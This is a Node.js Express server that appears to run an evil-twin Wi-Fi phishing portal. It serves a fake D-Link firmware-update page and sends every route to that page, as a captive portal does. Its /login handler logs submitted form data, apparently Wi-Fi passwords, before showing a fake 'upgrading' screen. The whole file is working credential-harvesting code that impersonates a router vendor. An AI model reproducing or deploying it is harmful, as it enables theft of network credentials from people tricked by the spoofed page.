const express = require("express");
const bodyParser = require("body-parser")
 
// New app using express module
const app = express();
app.use(bodyParser.urlencoded({
    extended:true
}));
 
app.get("/", function(req, res) {
  console.log(time()+"Route : "+app.mountpath)
 res.sendFile(__dirname + "/dlink/firmware.html");
});

app.get("/style.css", function(req, res) {
  console.log(time()+"Route : "+app.mountpath)
 res.sendFile(__dirname + "/dlink/style.css");
});

app.get("/head_01.gif", function(req, res) {
  console.log(time()+"Route : "+app.mountpath)
 res.sendFile(__dirname + "/dlink/head_01.gif");
});

app.get("/head_03.gif", function(req, res) {
  console.log(time()+"Route : "+app.mountpath)
 res.sendFile(__dirname + "/dlink/head_03.gif");
});

app.get("/tail.gif", function(req, res) {
  console.log(time()+"Route : "+app.mountpath)
 res.sendFile(__dirname + "/dlink/tail.gif");
});

app.get("/bootstrap.min.css", function(req, res) {
  console.log(time()+"Route : "+app.mountpath)
 res.sendFile(__dirname + "/fap/bootstrap.min.css");
});

app.get("/bootstrap.min.js", function(req, res) {
  console.log(time()+"Route : "+app.mountpath)
 res.sendFile(__dirname + "/fap/bootstrap.min.js");
});

app.get("/jquery.min.js", function(req, res) {
  console.log(time()+"Route : "+app.mountpath)
 res.sendFile(__dirname + "/fap/jquery.min.js");
});
 
app.post("/login", function(req, res) {
  //var pass1 = Number(req.body.password1);
  //var pass2 = Number(req.body.password2);
  console.log(time()+"Route : "+app.mountpath)
  console.log(req.body)
   res.sendFile(__dirname + "/fap/upgrading.html");
});

app.get("*", (req, res) => { 
  console.log(time()+"Route : "+app.mountpath)  
   res.sendFile(__dirname + "/dlink/firmware.html");
});
 
app.listen(80, function(){
  console.log("server is running on port 80");
})

function time(){
  const dateObj = new Date();
  return `${dateObj.toDateString()} | ${dateObj.toTimeString()} | `
}
